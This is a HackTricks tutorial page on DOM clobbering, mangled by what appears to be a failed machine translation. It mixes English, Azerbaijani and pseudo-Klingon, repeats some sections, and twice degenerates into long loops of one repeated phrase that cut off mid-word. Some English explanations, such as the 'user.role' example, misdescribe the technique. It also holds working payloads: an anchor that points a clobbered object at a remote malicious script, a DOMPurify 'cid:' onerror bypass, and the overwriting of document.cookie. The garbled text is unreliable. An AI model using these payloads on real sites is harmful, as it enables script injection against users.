# Dom Clobbering

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Basics**

**JS context**-Da **global variables** yaratmaq m√ºmk√ºnd√ºr **`id`** v…ô **`name`** atributlarƒ± HTML taglarƒ±nda.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Qatlh** jatlhpu' **name attribute** **clobber** globals **ghaH**, **embed**, **form**, **iframe**, **image**, **img** je **object** **ghaH**.

**Qapla'**, **form element** **clobber** **variable**, **toString** **value** **element** **`[object HTMLFormElement]`** **ghaH** **'ej** **anchor** **`toString`** **anchor `href`**. **vaj** **clobber** **`a`** **tag**, **value** **control** **treat** **string** **ghaH**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays & Attributes

**ghItlhvam** **array** **'ej** **'ay'** **attributes** **clobber** **jatlh** **'e':
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**To clobber** **a 3rd attribute** (e.g. x.y.z), **you need to use a** **`form`**:

**ghItlh** **a 3rd attribute** (e.g. x.y.z), **you need to use a** **`form`**:

---
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Clobbering more attributes is **more complicated but still possible**, using iframes:

**tlhIngan Hol translation:**

**QaSpu'DI' vItlhutlh. 'ach vItlhutlhbe'chugh, iframes vIlo'laHbe'.**
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
**Qa'vIn** 'e' vItlhutlh **iframe** 'e' **render** **ghItlh** **tag style**. **'ach** **undefined** **alert** **tlhIngan** **ghItlh**.
{% endhint %}

**iframes with html encoding** **ghItlh** **clobber** **attributes** **De'** **vItlhutlh** **'ej** **vaj** **'e'** **vay'** **ghItlh** **html encoding** **ghItlh** **use**.
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Filter Bypassing**

If a filter is **looping** through the **properties** of a node using something like `document.getElementByID('x').attributes` you could **clobber** the attribute **`.attributes`** and **break the filter**. Other DOM properties like **`tagName`** , **`nodeName`** or **`parentNode`** and more are also **clobberable**.

### **Filter Bypassing**

vaj vItlhutlh **looping** through the **properties** of a node using something like `document.getElementByID('x').attributes` you could **clobber** the attribute **`.attributes`** and **break the filter**. Other DOM properties like **`tagName`** , **`nodeName`** or **`parentNode`** and more are also **clobberable**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

In JavaScript it's common to find:

```javascript
window.someObject = someValue;
```

This code assigns a value to the `someObject` property of the `window` object. However, if the `someObject` property already exists, this code will overwrite its value.

This behavior can be exploited in a technique called "clobbering". By manipulating the `window` object, an attacker can overwrite existing properties or create new ones, potentially leading to Cross-Site Scripting (XSS) vulnerabilities.

To perform a successful clobbering attack, the attacker needs to identify a vulnerable JavaScript code that assigns a value to a property of the `window` object. Once identified, the attacker can inject malicious code to overwrite the existing property or create a new one.

For example, consider the following vulnerable code:

```javascript
window.someObject = userControlledInput;
```

In this case, if the `userControlledInput` is not properly sanitized, an attacker can inject malicious code that will be executed in the context of the vulnerable website.

To prevent clobbering attacks, it's important to properly sanitize user input and avoid assigning values directly to properties of the `window` object. Instead, use a separate object to store user-controlled data.
```javascript
var someObject = window.someObject || {};
```
Manipulating HTML on the page allows overriding `someObject` with a DOM node, potentially introducing security vulnerabilities. For example, you can replace `someObject` with an anchor element pointing to a malicious script:

---

**tlhIngan Hol Translation:**

HTML vItlhutlhlaHbe'chugh, `someObject` DOM node naDevmoH, vItlhutlhlaHbe' potentially introducing security vulnerabilities. Example, 'ejatlh `someObject` 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'chugh, 'ejatlh 'e' vItlhutlhlaHbe'ch
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
In a vulnerable code such as:

```javascript
var user = {
  name: "John",
  role: "user"
};

function processUser(user) {
  var isAdmin = user.role === "admin";
  if (isAdmin) {
    console.log("Welcome, admin!");
  } else {
    console.log("Welcome, user!");
  }
}

processUser(user);
```

An attacker can exploit a technique called DOM clobbering to modify the behavior of the code. DOM clobbering involves manipulating the global object's properties to overwrite existing variables or functions.

In this example, the attacker can inject malicious code to change the value of the `user.role` property. By setting `user.role` to `"admin"`, the attacker can trick the code into treating the user as an admin and granting unauthorized access.

To prevent DOM clobbering attacks, it is important to properly validate and sanitize user input. Additionally, using strict mode in JavaScript can help mitigate this vulnerability by preventing accidental creation of global variables.
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
**QIb**: **`DOMPurify`** **`cid:`** **protocol** **exploits** **execute** **unwanted** **code**.

**Trick**: **`DOMPurify`** **`cid:`** **protocol** **allows** **use**, **URL-encode** **double-quotes** **does not**. **This means** **inject** **encoded** **double-quote** **decoded** **runtime**. **Therefore**, **injecting** **something** **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** **HTML encoded** `&quot;` **decoded** **runtime** **escape** **attribute value** **create** **`onerror`** **event**.

**Another technique** **uses** **`form`** **element**. **Certain client-side libraries** **inspect** **attributes** **newly created form element** **clean** **them**. **However**, **adding** **`input`** **`id=attributes`** **inside** **form**, **you effectively overwrite** **attributes property**, **preventing** **sanitizer** **accessing** **actual attributes**.

**You can** [**find an example of this type of clobbering in this CTF writeup**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## **Clobbering document object**

**According to** **documentation** **possible** **overwrite** **attributes** **document object** **using** **DOM Clobbering**:

> **The** [**Document**](https://html.spec.whatwg.org/multipage/dom.html#document) **interface** [**supports named properties**](https://webidl.spec.whatwg.org/#dfn-support-named-properties). **The** [**supported property names**](https://webidl.spec.whatwg.org/#dfn-supported-property-names) **of a** [**Document**](https://html.spec.whatwg.org/multipage/dom.html#document) **object document** **at any moment** **consist of the following**, **in** [**tree order**](https://dom.spec.whatwg.org/#concept-tree-order) **according to** **element** **contributed them**, **ignoring later duplicates**, **and with values from** [**id**](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) **attributes coming before values from name attributes when the same element contributes both**:
>
> \- **The value of the name content attribute for all** [**exposed**](https://html.spec.whatwg.org/multipage/dom.html#exposed) [**embed**](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [**form**](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [**iframe**](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [**img**](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), **and** [**exposed**](https://html.spec.whatwg.org/multipage/dom.html#exposed) [**object**](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) **elements** **that have a non-empty name content attribute and are** [**in a document tree**](https://dom.spec.whatwg.org/#in-a-document-tree) **with document as their** [**root**](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- **The value of the** [**id**](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) **content attribute for all** [**exposed**](https://html.spec.whatwg.org/multipage/dom.html#exposed) [**object**](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) **elements** **that have a non-empty** [**id**](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) **content attribute and are** [**in a document tree**](https://dom.spec.whatwg.org/#in-a-document-tree) **with document as their** [**root**](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- **The value of the** [**id**](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) **content attribute for all** [**img**](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) **elements** **that have both a non-empty** [**id**](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) **content attribute and a non-empty name content attribute, and are** [**in a document tree**](https://dom.spec.whatwg.org/#in-a-document-tree) **with document as their** [**root**](https://dom.spec.whatwg.org/#concept-tree-root).

**Using** **technique** **you can overwrite** **commonly used** **values such as** `document.cookie`, `document.body`, `document.children`, **and even methods in the Document interface like** `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Writing after the element clobbered

**`document.getElementById()`** **`document.querySelector()`** calls can be altered by injecting a `<html>` or `<body>` tag with an identical id attribute. Here's how it can be done:

---

## qo'wI' 'e' yIqIm

**`document.getElementById()`** **`document.querySelector()`** calls can be altered by injecting a `<html>` or `<body>` tag with an identical id attribute. Here's how it can be done:

---
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Qatlh, injected HTML/body tags vItlhutlhlaHbe'chugh, 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' 